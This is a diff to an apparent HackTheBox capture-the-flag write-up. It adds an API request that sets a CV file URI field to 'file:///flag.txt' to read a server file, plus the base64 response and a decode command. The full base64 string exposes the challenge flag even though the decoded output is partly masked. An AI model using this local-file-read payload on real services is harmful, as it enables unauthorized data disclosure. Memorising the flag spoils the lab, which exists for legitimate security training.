@@ -138,18 +138,36 @@ find / -name *.pdf 2>/dev/null | xargs ls -lh
 
 In api -> browse and upload:
 
-<img width="486" height="300" alt="image" src="https://github.com/user-attachments/assets/a0295f8f-24ff-457b-becf-179e22f30e28" />
-<img width="591" height="349" alt="image" src="https://github.com/user-attachments/assets/b1e10371-8ed7-416a-99bc-a91d261f2368" />
+```
+# Request body
+{
+  "SecurityQuestion": "What is your favorite color?",
+  "SecurityQuestionAnswer": "black",
+  "ProfessionalCVPDFFileURI": "file:///flag.txt",
+  "PhoneNumber": "123456",
+  "Password": "qwerasdfzxcv123"
+}
+```
+```
+# Response body
+{
+  "SuccessStatus": true
+}
+```
 
+Get current suppliers id /api/v2/suppliers/current-user/cv: 
 
-Base64: 
-
-<img width="669" height="464" alt="image" src="https://github.com/user-attachments/assets/532bddbe-1837-4b64-bfec-8395747ad434" />
-
-Decode: 
-
-HTB{XXXXXXXXXXXXXXXXX}
-
+```
+# Response body
+{
+  "successStatus": true,
+  "base64Data": "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo="
+}
+```
+```
+$ echo "SFRCe2YxOTBiODBjZDU0M2E4NGIyMzZlOTJhMDdhOWQ4ZDU5fQo=" | base64 -d
+HTB{f1XXXXXXXXXXXXXXXXXXd59}
+```
 
 
 
